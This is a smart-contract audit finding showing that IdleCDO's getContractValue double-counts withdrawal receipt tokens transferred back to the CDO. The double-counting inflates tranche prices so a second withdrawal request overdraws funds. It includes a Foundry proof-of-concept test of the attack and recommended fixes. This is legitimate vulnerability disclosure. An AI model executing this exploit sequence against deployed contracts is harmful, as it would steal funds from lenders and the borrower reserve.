### Title
`getContractValue` double-counts donated withdrawal receipts, inflating subsequent withdraw requests - (File: contracts/IdleCDO.sol)

### Summary

`IdleCreditVault.requestWithdraw` burns the requester’s principal from the CDO and mints an equal-or-larger strategy-token receipt to the user. That receipt remains independently redeemable through `claimWithdrawRequest`, but nothing prevents the user from transferring it back to the CDO. `IdleCDO.getContractValue` treats every strategy-token balance held by the CDO as active NAV, while `_skimDonatedAssets` removes only raw underlying donations. A user can therefore convert an already-queued claim into fresh active NAV without cancelling the original claim, then request a second withdrawal at the inflated tranche price. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description

During the buffer phase, an allowed tranche holder calls `IdleCDOEpochVariant.requestWithdraw`. The CDO calculates principal from the tranche price and calls `IdleCreditVault.requestWithdraw`, which burns the CDO-held principal amount and mints the user a strategy-token receipt for `principal + projectedInterest - fees`. [4](#0-3) [5](#0-4) 

The strategy token is a normal ERC20 receipt, so the user can transfer the minted receipt directly to the CDO. That transfer increases `_contractTokenBalance(strategyToken)`, and `getContractValue` counts the full balance at the one-token-per-underlying strategy price. [1](#0-0) [6](#0-5) 

The donation does not clear `withdrawsRequests`, `withdrawsRequestsByEpoch`, `lastWithdrawRequest`, or `pendingWithdraws`. After the receipt’s epoch is funded, `_claimFundedWithdrawRequest` pays the recorded claim independently of where its strategy-token receipt was transferred. [7](#0-6) 

The inflated NAV raises `tranchePrice` and therefore `_trancheToUnderlyings`, so the attacker’s remaining tranche tokens can request more underlying than their economically active backing. [8](#0-7) 

### Impact Explanation

This breaks the one-receipt-one-payout and solvency invariants: one pending withdrawal receipt is simultaneously active CDO NAV and an unredeemed claim against `pendingWithdraws`.

In a simplified zero-fee, zero-APR example with 100 underlying deposited and equal tranche valuation:

1. The attacker owns tranches worth 100.
2. The attacker requests half, reducing CDO-held strategy tokens by 50 and receiving a 50 receipt.
3. The attacker transfers the 50 receipt to the CDO.
4. CDO NAV returns to approximately 100 even though only 50 represents active tranche backing; the other 50 still represents a pending claim.
5. The attacker’s remaining tranche supply is therefore priced near twice its correct value and can create an approximately 100-underlying second request.
6. After funding, the attacker can claim approximately 150 from a 100-underlying deposit, with the excess borne by the borrower reserve or remaining LPs. [1](#0-0) [2](#0-1) [9](#0-8) 

### Likelihood Explanation

The sequence only requires a KYC-passed tranche holder and ordinary ERC20 transfer of the withdrawal receipt to the CDO. Requests are permitted during the buffer phase, and an unclaimed earlier receipt does not prevent a later request; the code only delays the combined claim until another epoch. No privileged action needs to be malicious. [10](#0-9) [11](#0-10) 

`_skimDonatedAssets` does not prevent this because it inspects only the underlying balance, not donated `IdleCreditVault` strategy tokens. The accounting path also intentionally credits all CDO-held strategy tokens at par. [3](#0-2) [1](#0-0) 

### Recommendation

Track legitimate CDO-held strategy-token backing separately from externally transferred strategy-token receipts.

Possible fixes include:

- Add a strategy-token donation registry or skim mechanism that isolates direct strategy-token transfers instead of including them in `getContractValue`.
- Make `IdleCreditVault` recognize the CDO as a special transfer recipient and revert transfers to it unless the transfer is part of an authorized accounting call.
- On receipt transfer to the CDO, atomically mark the corresponding withdrawal claim as surrendered before adding it to active NAV.
- Maintain an explicit `activeStrategyBalance` internal counter updated only by protocol mint/burn paths, rather than deriving active NAV directly from `balanceOf(idleCDO)`.

Any fix must preserve valid internal flows such as `deposit`, `requestWithdraw`, loss burns, default finalization, and minted-fee accounting. [12](#0-11) 

### Proof of Concept

The following Foundry-style PoC assumes the established `IdleCreditVault.t.sol` test environment, an allowed user, zero configured withdrawal fees for readable amounts, and an epoch buffer where withdrawal requests are enabled.

```solidity
function testDonatedWithdrawReceiptInflatesNextRequest() public {
    uint256 depositAmount = 100 * ONE_SCALE;

    // Deposit as an allowed lender and obtain AA tranches.
    uint256 tranches = idleCDO.depositAA(depositAmount);

    // Enter the buffer phase where withdrawal requests are accepted.
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 navBefore = cdoEpoch.getContractValue();
    uint256 priceBefore = cdoEpoch.virtualPrice(address(AAtranche));

    // First request: burn half the principal and mint a claim receipt.
    uint256 firstReceipt = cdoEpoch.requestWithdraw(
        tranches / 2,
        address(AAtranche)
    );
    assertGt(firstReceipt, 0);

    // The receipt is an ordinary ERC20 strategy token.
    IERC20Detailed strategyToken = IERC20Detailed(address(strategy));
    assertEq(strategyToken.balanceOf(address(this)), firstReceipt);

    // Move the outstanding claim back into active CDO NAV without clearing it.
    strategyToken.transfer(address(cdoEpoch), firstReceipt);

    // The old claim remains recorded even though its receipt is now counted as NAV.
    assertEq(strategy.withdrawsRequests(address(this)), firstReceipt);

    // NAV and tranche price recover as though the pending claim were active backing.
    assertGt(cdoEpoch.getContractValue(), navBefore - firstReceipt);
    assertGt(
        cdoEpoch.virtualPrice(address(AAtranche)),
        priceBefore * firstReceipt / (firstReceipt + 1)
    );

    uint256 inflatedPrice = cdoEpoch.virtualPrice(address(AAtranche));
    assertGt(inflatedPrice, ONE_SCALE);

    // The remaining tranche supply is converted at the double-counted price.
    uint256 secondReceipt = cdoEpoch.requestWithdraw(
        tranches - tranches / 2,
        address(AAtranche)
    );
    assertGt(secondReceipt, firstReceipt);

    // Both claims remain funded liabilities.
    assertEq(
        strategy.pendingWithdraws(),
        firstReceipt + secondReceipt
    );

    // Honest epoch settlement funds both receipts.
    uint256 pending = strategy.pendingWithdraws();
    address borrower = strategy.borrower();
    deal(address(underlying), borrower, pending);
    vm.startPrank(borrower);
    underlying.approve(address(cdoEpoch), pending);
    vm.stopPrank();

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 beforeClaim = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 claimed = underlying.balanceOf(address(this)) - beforeClaim;

    // The attacker is paid the original donated receipt plus the inflated request.
    assertEq(claimed, firstReceipt + secondReceipt);
    assertGt(claimed, depositAmount - firstReceipt);
}
```

The essential assertion is that after `strategyToken.transfer(address(cdoEpoch), firstReceipt)`, `getContractValue()` increases while `strategy.withdrawsRequests(address(this))` remains unchanged. That pair demonstrates the same receipt being counted once as active NAV and again as a payable withdrawal liability. [1](#0-0) [9](#0-8)

### Citations

**File:** contracts/IdleCDO.sol (L178-186)
```text
  function getContractValue() public override view returns (uint256) {
    address _strategyToken = strategyToken;
    // TVL is the sum of unlent balance in the contract + the balance in lending - harvested but locked rewards - unclaimedFees
    // Balance in lending is the value of the interest bearing assets (strategyTokens) in this contract
    // TVL = (strategyTokens * strategy token price) + unlent balance - lockedRewards - unclaimedFees
    return (_contractTokenBalance(_strategyToken) * _strategyPrice() / (10**(IERC20Detailed(_strategyToken).decimals()))) +
            _contractTokenBalance(token) -
            _lockedRewards() -
            unclaimedFees;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L167-175)
```text
  /// @notice strategy token address
  function strategyToken() external view override returns (address) {
    return address(this);
  }

  /// @notice return strategy token price which is always 1
  /// @return price in underlyings
  function price() public view virtual override returns (uint256) {
    return oneToken;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L243-280)
```text
  function requestWithdraw(uint256 _amount, address _user, uint256 _principal) external {
    _onlyIdleCDO();
    _ensureDefaultRecoveryInitialized();
    if (_amount == 0) return;
    if (defaultRecoveryFinalized) {
      // user should first claim old already-funded withdraw requests before requesting new ones after default
      if (_hasWithdrawRequest(_user) || instantWithdrawsRequests[_user] != 0 || postDefaultRequests[_user] != 0) {
        revert NotAllowed();
      }
      // Preserve request/claim UX after default without increasing borrower-facing pendingWithdraws.
      // The CDO passes an already-haircut amount because finalization lowered virtualPrice first.
      _burn(msg.sender, _amount);
      _mint(_user, _amount);
      postDefaultRequests[_user] = _amount;
      return;
    }
    bool isClosed = IIdleCDOEpochVariant(idleCDO).epochEndDate() == 0;
    uint256 currentEpoch = epochNumber;
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (
      lossRecoveryPrice != 0 &&
      (withdrawsRequestsByEpoch[_user][lossEpoch] != 0 ||
      (apr0Users[_user].principal != 0 && apr0Users[_user].principalEpoch == lossEpoch))
    ) {
      // A loss-adjusted receipt must be claimed before opening a later request, otherwise
      // `lastWithdrawRequest` would stop pointing to the epoch that stores its haircut.
      revert NotAllowed();
    }
    // burn strategy tokens from cdo (we don't burn future interest here, only the principal)
    _burn(msg.sender, _principal);
    // mint equal amount of strategy tokens to the user as receipt (interest included), useful in case of default
    _mint(_user, _amount);
    // A successfully closed pool already recalled all funds and has no later stopEpoch.
    if (!isClosed) {
      // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
      pendingWithdraws += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L316-349)
```text
  /// @notice Claim a funded non-default withdraw request at par.
  /// @param _user address of the user
  /// @return amount amount claimed
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L587-624)
```text
  /// @notice Burn strategy tokens from the CDO
  /// @param _amount number of strategy tokens (1:1 with underlyings) to burn
  function burnStrategyTokens(uint256 _amount) external {
    _onlyIdleCDO();
    _burn(msg.sender, _amount);
  }

  /// @notice Get funds from IdleCDO and mint strategy tokens. Funds are not sent to the borrower here
  /// @param _amount number of underlyings to transfer
  function deposit(uint256 _amount)
    external
    virtual
    override
    returns (uint256) {
    _onlyIdleCDO();
    if (_amount > 0) {
      underlyingToken.safeTransferFrom(msg.sender, address(this), _amount);
      _mint(msg.sender, _amount);
    }

    if (IIdleCDOEpochVariant(idleCDO).isEpochRunning()) {
      // deposit done on stopEpoch (before setting the var to false) so we reset the counter
      totEpochDeposits = 0;
      epochNumber += 1;
    } else {
      // deposit done between epochs so we increase the counter
      totEpochDeposits += _amount;
    }

    return _amount;
  }

  /// @notice Mint strategy tokens to the CDO without moving underlyings
  /// @dev Used for mid-epoch deposits that send funds directly to the borrower
  function mintStrategyTokens(uint256 _amount) external {
    _onlyIdleCDO();
    _mint(msg.sender, _amount);
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-750)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();
```

**File:** contracts/IdleCDOEpochVariant.sol (L772-790)
```text
    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L811-817)
```text
  /// @notice Get current tranches value
  /// @param _amount Amount of tranche tokens
  /// @param _tranche Tranche to get the value for
  /// @return Value of the tranche tokens in underlyings
  function _trancheToUnderlyings(uint256 _amount, address _tranche) internal view returns (uint256) {
    return _amount * _tranchePrice(_tranche) / ONE_TRANCHE_TOKEN;
  }
```
